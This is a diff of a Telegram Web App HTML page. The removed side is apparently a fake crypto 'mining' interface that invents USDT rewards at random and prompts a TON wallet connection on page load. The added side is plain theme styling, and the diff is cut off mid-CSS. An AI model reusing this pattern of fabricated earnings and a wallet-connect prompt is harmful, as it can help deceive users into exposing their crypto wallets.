@@ -1,827 +1,1834 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <title></title>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <script type="text/javascript" src="https://rawgit.com/victornpb/f639f37373be0f6e82e1/raw/5d8f7ee8b32ae04de087d2377d8086e3389ee411/AES.js"></script>
-        <script src="https://telegram.org/js/telegram-web-app.js"></script>
-        <link rel="apple-touch-icon" type="image/png" href="https://cpwebassets.codepen.io/assets/favicon/apple-touch-icon-5ae1a0698dcc2402e9712f7d01ed509a57814f994c660df9f7a952f3060705ee.png">
-        <meta name="apple-mobile-web-app-title" content="CodePen">
-        <link rel="shortcut icon" type="image/x-icon" href="https://cpwebassets.codepen.io/assets/favicon/favicon-aec34940fbc1a6e787974dcd360f2c6b63348d4b1f4e06c77743096d55480f33.ico">
-        <link rel="mask-icon" type="image/x-icon" href="https://cpwebassets.codepen.io/assets/favicon/logo-pin-b4b4269c16397ad2f0f7a01bcdf513a1994f4c94b8af2f191c09eb0d601762b1.svg" color="#111">
-    <script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-2c7831bb44f98c1391d6a4ffda0e1fd302503391ca806e7fcc7b9b87197aec26.js"></script>
-  <title>Latest transactions</title>
-    <link rel="canonical" href="https://codepen.io/havardob/pen/PoWbeoZ">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
-  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@200..800&display=swap" rel="stylesheet">
-  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-
-
-
-
-    </head>
-    <style>
-@import url("https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap");
-*,
-*:after,
-*:before {
-  box-sizing: border-box;
-}
-
-body {
-  font-family: "Inter", sans-serif;
-  line-height: 1.5;
-  min-height: 100vh;
-  padding: 5rem 0;
-  font-size: clamp(1rem, 2.5vw, 1.125rem);
-  background-color: #fff;
-}
-
-.fancy {
-  position: relative;
-  white-space: nowrap;
-  &:after {
-    --deco-height: 0.3125em;
-    content: "";
-    position: absolute;
-    left: 0;
-    right: 0;
-    bottom: calc(var(--deco-height) * -0.625);
-    height: var(--deco-height);
-    background-image: url("data:image/svg+xml,%3Csvg width='100' height='64' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cg clip-path='url(%23a)'%3E%3Cpath d='M-17 30.5C-1 22 72-4 54 13 37.9 28.2-2.5 57.5 16 55.5s72-29 104-40' stroke='%2300FDCF' stroke-width='10'/%3E%3C/g%3E%3Cdefs%3E%3CclipPath id='a'%3E%3Cpath fill='%23fff' d='M0 0h100v64H0z'/%3E%3C/clipPath%3E%3C/defs%3E%3C/svg%3E%0A");
-    background-size: auto 100%;
-    background-repeat: round;
-    background-position: 0em;
-  }
-}
-
-section {
-  width: 90%;
-  max-width: 800px;
-  margin-left: auto;
-  margin-right: auto;
-}
-section + section {
-  margin-top: 2.5em;
-}
-
-h1 {
-  font-weight: 700;
-  line-height: 1.125;
-  font-size: clamp(1.5rem, 2.5vw, 2.5rem);
-  text-align: center;
-
-}
-#usdt{
-	font-weight: 700;
-	font-family: "Manrope", sans-serif;
-  	line-height: 1.125;
-  	font-size: clamp(2rem, 3vw, 3rem);
-	padding: 0px 0px 10px 0px;
-  	text-align: center;
-}
-
-h2 {
-  margin-top: 0.25em;
-  color: #999;
-  font-size: clamp(1.125rem, 2.5vw, 1.25rem);
-  text-align: center;
-
-}
-
-
-h2 + * {
-  margin-top: 1.5em;
-}
-
-summary {
-  background-color: transparent;
-  position: relative;
-  cursor: pointer;
-  padding: 1em 0.5em;
-  list-style: none;
-}
-summary::-webkit-details-marker {
-  display: none;
-}
-summary:hover {
-  background-color: transparent;
-}
-summary div {
-  display: flex;
-  align-items: center;
-}
-summary h3 {
-  display: flex;
-  flex-direction: column;
-}
-summary small {
-  color: #999;
-  font-size: 0.875em;
-}
-summary strong {
-  font-weight: 700;
-}
-summary span:first-child {
-  width: 4rem;
-  height: 4rem;
-  border-radius: 10px;
-  background-color: #f3e1e1;
-  display: flex;
-  flex-shrink: 0;
-  align-items: center;
-  justify-content: center;
-  margin-right: 1.25em;
-}
-summary span:first-child svg {
-  width: 2.25rem;
-  height: 2.25rem;
-}
-summary span:last-child {
-  font-weight: 700;
-  margin-left: auto;
-}
-summary:focus {
-  outline: none;
-}
-summary .plus {
-  color: #289672;
-}
-
-details {
-  border-bottom: 1px solid #b5bfd9;
-}
-details[open] {
-  box-shadow: -3px 0 0 #b5bfd9;
-}
-details:first-of-type {
-  border-top: 1px solid #b5bfd9;
-}
-details > div {
-  padding: 2em 2em 0;
-  font-size: 0.875em;
-}
-
-dl {
-  display: flex;
-  flex-wrap: wrap;
-}
-dl dt {
-  font-weight: 700;
-}
-dl div {
-  margin-right: 4em;
-  margin-bottom: 2em;
-}
-
-#hh{
-	padding: 10px;
-  display: flex;
-  justify-content: center;
-}
-
-
-.withdraw {
-	width: 150px;
-	height: 40px;
-	border-radius: 6px;
-	display: flex;
-  justify-content: center;
-  align-items: center;
-	font-weight: 700;
-	font-family: "Manrope", sans-serif;
-  	line-height: 1.125;
-  	font-size: 18px;
-
-	box-shadow: rgba(100, 100, 111, 0.2) 0px 7px 29px 0px;
-}
-.support {
-	width: 125px;
-	height: 40px;
-	border-radius: 6px;
-	display: flex;
-  justify-content: center;
-  align-items: center;
-	font-weight: 700;
-  color: #fff;
-	font-family: "Manrope", sans-serif;
-  	line-height: 1.125;
-  	font-size: 12px;
-    background-color: #147ffa;
-
-	box-shadow: rgba(100, 100, 111, 0.2) 0px 7px 29px 0px;
-}
-
-</style>
-<style>
-@import url("https://fonts.googleapis.com/css2?family=Outfit:wght@100;200;300;400;500;600;700;800;900&display=swap");
-
-*,
-*:before,
-*:after {
-	box-sizing: border-box;
-}
-
-
-button,
-input,
-select,
-textarea {
-	font: inherit;
-}
-
-a {
-	color: inherit;
-}
-
-/* End basic CSS override */
-
-* {
-	scrollbar-width: 0;
-}
-
-*::-webkit-scrollbar {
-	background-color: transparent;
-	width: 12px;
-}
-
-*::-webkit-scrollbar-thumb {
-	border-radius: 99px;
-	background-color: #ddd;
-	border: 4px solid #fff;
-}
-
-.modal {
-	position: absolute;
-	top: 0;
-	left: 0;
-	right: 0;
-	bottom: 0;
-	display: flex;
-	align-items: center;
-	justify-content: center;
-	background-color: rgba(#000, 0.25);
-}
-
-.modal-container {
-	max-height: 90vh;
-	max-width: 500px;
-	margin-left: auto;
-	margin-right: auto;
-	background-color: #fff;
-	border-radius: 16px;
-	overflow: hidden;
-	display: flex;
-	flex-direction: column;
-	box-shadow: 0 15px 30px 0 rgba(#000, 0.25);
-	@media (max-width: 600px) {
-		width: 90%;
-	}
-}
-
-.modal-container-header {
-	padding: 16px 32px;
-	border-bottom: 1px solid #ddd;
-	display: flex;
-	align-items: center;
-	justify-content: space-between;
-}
-
-.modal-container-title {
-	display: flex;
-	align-items: center;
-	gap: 8px;
-	line-height: 1;
-	font-weight: 700;
-	font-size: 1.125;
-	svg {
-		width: 32px;
-		height: 32px;
-		color: #750550;
-	}
-}
-
-.modal-container-body {
-	padding: 24px 32px 51px;
-	overflow-y: auto;
-}
-
-.rtf {
-	h1,
-	h2,
-	h3,
-	h4,
-	h5,
-	h6 {
-		font-weight: 700;
-	}
-
-	h1 {
-		font-size: 1.5rem;
-		line-height: 1.125;
-	}
-
-	h2 {
-		font-size: 1.25rem;
-		line-height: 1.25;
-	}
-
-	h3 {
-		font-size: 1rem;
-		line-height: 1.5;
-	}
-
-	& > * + * {
-		margin-top: 1em;
-	}
-
-	& > * + :is(h1, h2, h3) {
-		margin-top: 2em;
-	}
-
-	& > :is(h1, h2, h3) + * {
-		margin-top: 0.75em;
-	}
-
-	ul,
-	ol {
-		margin-left: 20px;
-		list-style-position: inside;
-	}
-
-	ol {
-		list-style: numeric;
-	}
-
-	ul {
-		list-style: disc;
-	}
-}
-
-.modal-container-footer {
-	padding: 20px 32px;
-	display: flex;
-	align-items: center;
-	justify-content: flex-end;
-	border-top: 1px solid #ddd;
-	gap: 12px;
-	position: relative;
-	&:after {
-		content: "";
-		display: block;
-		position: absolute;
-		top: -51px;
-		left: 24px;
-		right: 24px;
-		height: 50px;
-		flex-shrink: 0;
-		background-image: linear-gradient(to top, rgba(#fff, 0.75), transparent);
-		pointer-events: none;
-	}
-}
-
-.button {
-	padding: 12px 20px;
-	border-radius: 8px;
-	background-color: transparent;
-	border: 0;
-	font-weight: 600;
-	cursor: pointer;
-	transition: 0.15s ease;
-
-	&.is-ghost {
-		&:hover,
-		&:focus {
-			background-color: #dfdad7;
-		}
-	}
-
-	&.is-primary {
-		background-color: #000;
-		color: #fff;
-		&:hover,
-		&:focus {
-			background-color: #999;
-		}
-	}
-}
-
-.icon-button {
-	padding: 0;
-	border: 0;
-	background-color: transparent;
-	width: 40px;
-	height: 40px;
-	display: flex;
-	align-items: center;
-	justify-content: center;
-	line-height: 1;
-	cursor: pointer;
-	border-radius: 8px;
-	transition: 0.15s ease;
-	svg {
-		width: 24px;
-		height: 24px;
-	}
-
-	&:hover,
-	&:focus {
-		background-color: #dfdad7;
-	}
-}
-
-</style>
-
-<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="MobileOptimized" content="176" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="robots" content="noindex,nofollow" />
+    <script src="https://telegram.org/js/telegram-web-app.js?2"></script>
     <script>
-let tg = window.Telegram.WebApp;
+        function setThemeClass() {
+            document.documentElement.className = Telegram.WebApp.colorScheme;
+        }
 
-
-let lst = 0.0001; //lusdt
-
-tg.MainButton.text = "Mine";
-tg.MainButton.color = "#000";
-tg.MainButton.textColor = "#fff";
-tg.MainButton.hasShineEffect = true;
-tg.setHeaderColor("#fff");
-tg.setBottomBarColor("#fff");
-// tg.setBackgroundColor("#fff");
-tg.MainButton.show();
-tg.MainButton.onClick(function(){
-	if(activeMining == true){
-		activeMining=false;
-		tg.MainButton.text = "Mine";
-		tg.MainButton.hasShineEffect = true;
-
-	}
-	else{
-		activeMining=true;
-		tg.MainButton.text = "Stop mining";
-		tg.MainButton.hasShineEffect = false;
-
-	}
-});
-tg.expand();
-
-
-
-
-function random(max) {
-  return Math.floor(Math.random() * max);
-}
-function aroundom(min, max) {
-  return Math.random() * (max - min) + min;
-}
-
-window.addEventListener("load", (event) => {
-    // // function ii(){
-    // setTgPrem("no");
-    getTgPrem();
-    
-});
-
-window.setInterval(function(){
-    document.getElementById("usdt").innerHTML = `<span class="fancy">${lst} MKT</span>`;
-    getMktTokens();
-}, 1000);
-
-function truncate(str, maxlength) {
-
-    if (str.length > maxlength) {
-        str = str.substring(0, maxlength-3);     // итоговая длина равна maxlength
-        return str + "...";
-        // В кодировке Unicode существует специальный символ «троеточие»: … (HTML: &hellip;)
-    }
-    else
-    return str;
-}
-
-function LockPhrase(block, password){
-var text = Aes.Ctr.encrypt(block, password, 128);
-return text;
-}
-
-function UnlockPhrase(block, password){
-var text = Aes.Ctr.decrypt(block, password, 128);
-return text;
-}
-
-function MainButtonActiveMining(){
-	tg.MainButton.setText("Остановить майнинг");
-	activeMining = true;
-	tg.MainButton.onClick(MainButtonDisactiveMining());
-	tg.expand();
-}
-function MainButtonDisactiveMining(){
-	tg.MainButton.setText("Начать майнинг");
-	activeMining = false;
-	tg.MainButton.onClick(MainButtonActiveMining());
-	tg.expand();
-}
-
-function addBllck(blockId, reward, data, lst, hash, golden, wallet){
-	let blockTime =  blockId / 1000 + aroundom(6000, 30000);
-
-    let content = document.getElementById("checking");
-    const block = document.createElement('details');
-    block.id = blockId;
-    content.appendChild(block);
-    block.innerHTML = `
-      <summary>
-			<div>
-				<span style="background-color: #f2dcbb;">
-					<!--<svg xmlns="http://www.w3.org/2000/svg" width="192" height="192" fill="currentColor" viewBox="0 0 256 256">
-						<rect width="256" height="256" fill="none"></rect>
-						<path d="M192,120h27.05573a8,8,0,0,0,7.15542-4.42229l18.40439-36.80878a8,8,0,0,0-3.18631-10.52366L192,40" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></path>
-						<path d="M64,120H36.94427a8,8,0,0,1-7.15542-4.42229L11.38446,78.76893a8,8,0,0,1,3.18631-10.52366L64,40" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></path>
-						<path d="M160,40a32,32,0,0,1-64,0H64V208a8,8,0,0,0,8,8H184a8,8,0,0,0,8-8V40Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></path>
-					</svg>-->
-                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M17.6005 5.31125L11.9505 2.27125C11.3505 1.95125 10.6405 1.95125 10.0405 2.27125L4.40047 5.31125C3.99047 5.54125 3.73047 5.98125 3.73047 6.46125C3.73047 6.95125 3.98047 7.39125 4.40047 7.61125L10.0505 10.6512C10.3505 10.8112 10.6805 10.8913 11.0005 10.8913C11.3205 10.8913 11.6605 10.8112 11.9505 10.6512L17.6005 7.61125C18.0105 7.39125 18.2705 6.95125 18.2705 6.46125C18.2705 5.98125 18.0105 5.54125 17.6005 5.31125Z" fill="#000000"></path> <path d="M9.12 11.7106L3.87 9.09058C3.46 8.88058 3 8.91058 2.61 9.14058C2.23 9.38058 2 9.79058 2 10.2406V15.2006C2 16.0606 2.48 16.8306 3.25 17.2206L8.5 19.8406C8.68 19.9306 8.88 19.9806 9.08 19.9806C9.31 19.9806 9.55 19.9106 9.76 19.7906C10.14 19.5506 10.37 19.1406 10.37 18.6906V13.7306C10.36 12.8706 9.88 12.1006 9.12 11.7106Z" fill="#000000"></path> <path d="M20.0006 10.2406V12.7006C19.5206 12.5606 19.0106 12.5006 18.5006 12.5006C17.1406 12.5006 15.8106 12.9706 14.7606 13.8106C13.3206 14.9406 12.5006 16.6506 12.5006 18.5006C12.5006 18.9906 12.5606 19.4806 12.6906 19.9506C12.5406 19.9306 12.3906 19.8706 12.2506 19.7806C11.8706 19.5506 11.6406 19.1406 11.6406 18.6906V13.7306C11.6406 12.8706 12.1206 12.1006 12.8806 11.7106L18.1306 9.09058C18.5406 8.88058 19.0006 8.91058 19.3906 9.14058C19.7706 9.38058 20.0006 9.79058 20.0006 10.2406Z" fill="#000000"></path> <path d="M22.58 21.4989L21.74 20.6589C22.18 19.9989 22.44 19.1989 22.44 18.3489C22.44 16.0189 20.55 14.1289 18.22 14.1289C15.89 14.1289 14 16.0189 14 18.3489C14 20.6789 15.89 22.5689 18.22 22.5689C19.07 22.5689 19.87 22.3089 20.53 21.8689L21.37 22.7089C21.54 22.8789 21.75 22.9589 21.97 22.9589C22.19 22.9589 22.41 22.8789 22.57 22.7089C22.91 22.3689 22.91 21.8289 22.58 21.4989Z" fill="#000000"></path> </g></svg>
-
-				</span>
-				<h3>
-					<strong>Block [${golden}]</strong>
-					<small id="${blockId}block">${parseMil(blockTime)}</small>
-				</h3>
-				<span class="plus">Searching...</span>
-			</div>
-		</summary>
-		<div>
-			<dl>
-				<div>
-					<dt>Block</dt>
-					<dd>${data}</dd>
-				</div>
-
-				<div>
-					<dt>Hash used</dt>
-					<dd><a href="#" style="text-decoration: none;">${truncate(hash, 10)}<svg height="16" width="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M17.5303 10.0303C17.8232 9.73744 17.8232 9.26256 17.5303 8.96967L12.5303 3.96967C12.2374 3.67678 11.7626 3.67678 11.4697 3.96967L6.46967 8.96967C6.17678 9.26256 6.17678 9.73744 6.46967 10.0303C6.76256 10.3232 7.23744 10.3232 7.53033 10.0303L11.25 6.31066L11.25 14.5C11.25 15.2133 11.0298 16.3 10.3913 17.1868C9.7804 18.0353 8.75556 18.75 7 18.75C6.58579 18.75 6.25 19.0858 6.25 19.5C6.25 19.9142 6.58579 20.25 7 20.25C9.24444 20.25 10.7196 19.298 11.6087 18.0632C12.4702 16.8667 12.75 15.4534 12.75 14.5L12.75 6.31066L16.4697 10.0303C16.7626 10.3232 17.2374 10.3232 17.5303 10.0303Z" fill="#000000"></path> </g></svg></a></dd> <!--•-->
-				</div>
-
-				<div>
-					<dt>Block ID</dt>
-					<dd>#${blockId}</dd>
-				</div>
-				<div>
-					<dt>Wallet</dt>
-					<dd><a href="https://tonviewer.com/${wallet}" style="text-decoration: none;">${truncate(wallet, 10)}<svg height="16" width="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M17.5303 10.0303C17.8232 9.73744 17.8232 9.26256 17.5303 8.96967L12.5303 3.96967C12.2374 3.67678 11.7626 3.67678 11.4697 3.96967L6.46967 8.96967C6.17678 9.26256 6.17678 9.73744 6.46967 10.0303C6.76256 10.3232 7.23744 10.3232 7.53033 10.0303L11.25 6.31066L11.25 14.5C11.25 15.2133 11.0298 16.3 10.3913 17.1868C9.7804 18.0353 8.75556 18.75 7 18.75C6.58579 18.75 6.25 19.0858 6.25 19.5C6.25 19.9142 6.58579 20.25 7 20.25C9.24444 20.25 10.7196 19.298 11.6087 18.0632C12.4702 16.8667 12.75 15.4534 12.75 14.5L12.75 6.31066L16.4697 10.0303C16.7626 10.3232 17.2374 10.3232 17.5303 10.0303Z" fill="#000000"></path> </g></svg></a></dd>
-				</div>
-			</dl>
-		</div>
-      `;
-	  blocks++;
-	  setInterval(function() {
-		blockTime = blockTime - 1000;
-		let element = document.getElementById(`${blockId}block`);
-		if (typeof(element) != 'undefined' && element != null)
-		{
-			element.innerHTML = `${parseMil(blockTime)}`;
-		}
-		else{
-			return 0;
-		}
-	  }, 1000)
-    //   console.log("ff");
-	  setTimeout(function() {
-		let completed = document.getElementById("completed");
-    const blockComp = document.createElement('details');
-    blockComp.id = blockId;
-    content.removeChild(block);
-    completed.appendChild(blockComp);
-    blockComp.innerHTML = `
-      <summary>
-			<div>
-				<span style="background-color: #f2dcbb;">
-					<!--<svg xmlns="http://www.w3.org/2000/svg" width="192" height="192" fill="currentColor" viewBox="0 0 256 256">
-						<rect width="256" height="256" fill="none"></rect>
-						<path d="M192,120h27.05573a8,8,0,0,0,7.15542-4.42229l18.40439-36.80878a8,8,0,0,0-3.18631-10.52366L192,40" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></path>
-						<path d="M64,120H36.94427a8,8,0,0,1-7.15542-4.42229L11.38446,78.76893a8,8,0,0,1,3.18631-10.52366L64,40" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></path>
-						<path d="M160,40a32,32,0,0,1-64,0H64V208a8,8,0,0,0,8,8H184a8,8,0,0,0,8-8V40Z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="16"></path>
-					</svg>-->
-                                   <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M17.6005 5.31125L11.9505 2.27125C11.3505 1.95125 10.6405 1.95125 10.0405 2.27125L4.40047 5.31125C3.99047 5.54125 3.73047 5.98125 3.73047 6.46125C3.73047 6.95125 3.98047 7.39125 4.40047 7.61125L10.0505 10.6512C10.3505 10.8112 10.6805 10.8913 11.0005 10.8913C11.3205 10.8913 11.6605 10.8112 11.9505 10.6512L17.6005 7.61125C18.0105 7.39125 18.2705 6.95125 18.2705 6.46125C18.2705 5.98125 18.0105 5.54125 17.6005 5.31125Z" fill="#000000"></path> <path d="M9.12 11.7106L3.87 9.09058C3.46 8.88058 3 8.91058 2.61 9.14058C2.23 9.38058 2 9.79058 2 10.2406V15.2006C2 16.0606 2.48 16.8306 3.25 17.2206L8.5 19.8406C8.68 19.9306 8.88 19.9806 9.08 19.9806C9.31 19.9806 9.55 19.9106 9.76 19.7906C10.14 19.5506 10.37 19.1406 10.37 18.6906V13.7306C10.36 12.8706 9.88 12.1006 9.12 11.7106Z" fill="#000000"></path> <path d="M20.0006 10.2406V12.7006C19.5206 12.5606 19.0106 12.5006 18.5006 12.5006C17.1406 12.5006 15.8106 12.9706 14.7606 13.8106C13.3206 14.9406 12.5006 16.6506 12.5006 18.5006C12.5006 18.9906 12.5606 19.4806 12.6906 19.9506C12.5406 19.9306 12.3906 19.8706 12.2506 19.7806C11.8706 19.5506 11.6406 19.1406 11.6406 18.6906V13.7306C11.6406 12.8706 12.1206 12.1006 12.8806 11.7106L18.1306 9.09058C18.5406 8.88058 19.0006 8.91058 19.3906 9.14058C19.7706 9.38058 20.0006 9.79058 20.0006 10.2406Z" fill="#000000"></path> <path d="M21.98 15.6695C21.16 14.6595 19.91 14.0195 18.5 14.0195C17.44 14.0195 16.46 14.3895 15.69 15.0095C14.65 15.8295 14 17.0995 14 18.5195C14 19.3595 14.24 20.1595 14.65 20.8395C14.92 21.2895 15.26 21.6795 15.66 21.9995H15.67C16.44 22.6395 17.43 23.0195 18.5 23.0195C19.64 23.0195 20.67 22.5995 21.46 21.8995C21.81 21.5995 22.11 21.2395 22.35 20.8395C22.76 20.1595 23 19.3595 23 18.5195C23 17.4395 22.62 16.4395 21.98 15.6695ZM20.76 17.9595L18.36 20.1795C18.22 20.3095 18.03 20.3795 17.85 20.3795C17.66 20.3795 17.47 20.3095 17.32 20.1595L16.21 19.0495C15.92 18.7595 15.92 18.2795 16.21 17.9895C16.5 17.6995 16.98 17.6995 17.27 17.9895L17.87 18.5895L19.74 16.8595C20.04 16.5795 20.52 16.5995 20.8 16.8995C21.09 17.2095 21.07 17.6795 20.76 17.9595Z" fill="#000000"></path> </g></svg>
-
-				</span>
-				<h3>
-					<strong>Success Block</strong>
-					<small>${golden}</small>
-				</h3>
-				<span class="plus">+${reward.toFixed(2)} USDT</span>
-			</div>
-		</summary>
-		<div>
-			<dl>
-				<div>
-					<dt>Hash used</dt>
-					<dd>${data}</dd>
-				</div>
-
-				<div>
-					<dt>Hash used</dt>
-					<dd><a href="#" style="text-decoration: none;">${truncate(hash, 10)}<svg height="16" width="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M17.5303 10.0303C17.8232 9.73744 17.8232 9.26256 17.5303 8.96967L12.5303 3.96967C12.2374 3.67678 11.7626 3.67678 11.4697 3.96967L6.46967 8.96967C6.17678 9.26256 6.17678 9.73744 6.46967 10.0303C6.76256 10.3232 7.23744 10.3232 7.53033 10.0303L11.25 6.31066L11.25 14.5C11.25 15.2133 11.0298 16.3 10.3913 17.1868C9.7804 18.0353 8.75556 18.75 7 18.75C6.58579 18.75 6.25 19.0858 6.25 19.5C6.25 19.9142 6.58579 20.25 7 20.25C9.24444 20.25 10.7196 19.298 11.6087 18.0632C12.4702 16.8667 12.75 15.4534 12.75 14.5L12.75 6.31066L16.4697 10.0303C16.7626 10.3232 17.2374 10.3232 17.5303 10.0303Z" fill="#000000"></path> </g></svg></a></dd> <!--•-->
-				</div>
-
-				<div>
-					<dt>Block ID</dt>
-					<dd>#${blockId}</dd>
-				</div>
-				<div>
-					<dt>Wallet</dt>
-					<dd><a href="https://tonviewer.com/${wallet}" style="text-decoration: none;">${truncate(wallet, 10)}<svg height="16" width="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path fill-rule="evenodd" clip-rule="evenodd" d="M17.5303 10.0303C17.8232 9.73744 17.8232 9.26256 17.5303 8.96967L12.5303 3.96967C12.2374 3.67678 11.7626 3.67678 11.4697 3.96967L6.46967 8.96967C6.17678 9.26256 6.17678 9.73744 6.46967 10.0303C6.76256 10.3232 7.23744 10.3232 7.53033 10.0303L11.25 6.31066L11.25 14.5C11.25 15.2133 11.0298 16.3 10.3913 17.1868C9.7804 18.0353 8.75556 18.75 7 18.75C6.58579 18.75 6.25 19.0858 6.25 19.5C6.25 19.9142 6.58579 20.25 7 20.25C9.24444 20.25 10.7196 19.298 11.6087 18.0632C12.4702 16.8667 12.75 15.4534 12.75 14.5L12.75 6.31066L16.4697 10.0303C16.7626 10.3232 17.2374 10.3232 17.5303 10.0303Z" fill="#000000"></path> </g></svg></a></dd>
-				</div>
-			</dl>
-		</div>
-      `;
-	  document.getElementById("usdt").innerHTML = `<span class="fancy">${lst.toFixed(2)} USDT</span>`;
-
-	  }, blockTime);
-
-}
-
-async function connectToWallet() {
-        const connectedWallet = await tonConnectUI.connectWallet();
-        // Do something with connectedWallet if needed
-        console.log(connectedWallet);
-    }
-connectToWallet().catch(error => {
-        console.error("Error connecting to wallet:", error);
-    });
-
-
+        Telegram.WebApp.onEvent('themeChanged', setThemeClass);
+        setThemeClass();
 
     </script>
-    <body>
-	<div>
-  		<div id="ton-connect" style="position: absolute; top: 2%; right: 5%; z-index: 10"></div>
-		<p id="usdt"><span class="fancy">0.00 USDT</span></p>
-		<div id="hh">
-  		<div class="withdraw" onclick="trans()">Withdraw</div>
-		</div>
-    <div id="hh">
-  		  <div class="support" onclick="getMktTokens()">Support</div>
-		</div>
+    <title></title>
+    <style>
+        body {
+            --bg-color: var(--tg-theme-bg-color, #fff);
+            font-family: sans-serif;
+            background-color: var(--bg-color);
+            color: var(--tg-theme-text-color, #222);
+            font-size: 14px;
+            margin: 0;
+            padding: 0;
+            color-scheme: var(--tg-color-scheme);
+        }
 
-	</div>
+        body.gray {
+            background-color: var(--tg-theme-secondary-bg-color, #efefef);
+        }
 
-  <section id="contentyy">
-	<h1 style="padding: 40px 0px 0px 0px;">Latest Blocks</h1>
-	<h2>Checking...</h2>
-       <div id="checking">
-       </div>
-       <br>
-       <br>
-       <br>
-       <h1>Latest Transactions</h1>
-	<h2>There's nothing here yet...</h2>
-	<div id="completed">
-		<h2 style="font-size: 12px;"></h2>
-	
-	</div>
+        a {
+            color: var(--tg-theme-link-color, #2678b6);
+        }
 
-       
+        .btn {
+            font-size: 14px;
+            padding: 10px 17px;
+        }
+
+        .btn-primary {
+            background-color: var(--tg-theme-button-color, #50a8eb);
+            color: var(--tg-theme-button-text-color, #fff);
+            border: none;
+        }
+
+        button {
+            display: block;
+            width: 100%;
+            font-size: 14px;
+            margin: 15px 0;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            background-color: var(--tg-theme-button-color, #50a8eb);
+            color: var(--tg-theme-button-text-color, #ffffff);
+            cursor: pointer;
+        }
+
+        .main-container {
+            padding: 15px;
+        }
+
+        .list-header {
+            text-transform: uppercase;
+            font-size: .92em;
+            color: var(--tg-theme-hint-color, #ccc);
+            margin: 0 0 10px;
+        }
+
+        a.list-group-item,
+        button.list-group-item {
+            color: var(--tg-theme-text-color, #222);
+        }
+
+        .main-container p {
+            margin: 0 0 10px;
+        }
+
+        .main-container pre,
+        .main-container > .btn {
+            margin: 0 0 7px;
+        }
+
+        .main-container pre + .hint,
+        .main-container > .btn + .hint {
+            text-align: center;
+            margin: 0 0 15px;
+        }
+
+        button[disabled] {
+            opacity: 0.6;
+            cursor: auto;
+            pointer-events: none;
+        }
+
+        button.close_btn {
+            /*position: fixed;*/
+            position: absolute;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            border-radius: 0;
+            margin: 0;
+            padding: 16px 20px;
+            text-transform: uppercase;
+        }
+
+        input[type="text"],
+        .input[contenteditable] {
+            display: block;
+            box-sizing: border-box;
+            font-size: 14px;
+            width: 100%;
+            padding: 12px 20px;
+            margin: 15px 0;
+            border: 1px solid var(--tg-theme-link-color, #000);
+            background-color: var(--tg-theme-bg-color, #ffffff);
+            border-radius: 4px;
+            color: var(--tg-theme-text-color, #222222);
+            text-align: start;
+        }
+
+        input[type="text"]::-webkit-input-placeholder {
+            color: var(--tg-theme-hint-color, #ccc);
+        }
+
+        input[type="text"]::-moz-placeholder {
+            color: var(--tg-theme-hint-color, #ccc);
+        }
+
+        input[type="text"]:-ms-input-placeholder {
+            color: var(--tg-theme-hint-color, #ccc);
+        }
+
+        .input[data-placeholder] {
+            position: relative;
+        }
+
+        .input[data-placeholder]:empty:before {
+            position: absolute;
+            left: 0;
+            right: 0;
+            content: attr(data-placeholder);
+            color: var(--tg-theme-hint-color, #ccc);
+            padding: 0 20px;
+            font-weight: normal;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+            overflow: hidden;
+            pointer-events: none;
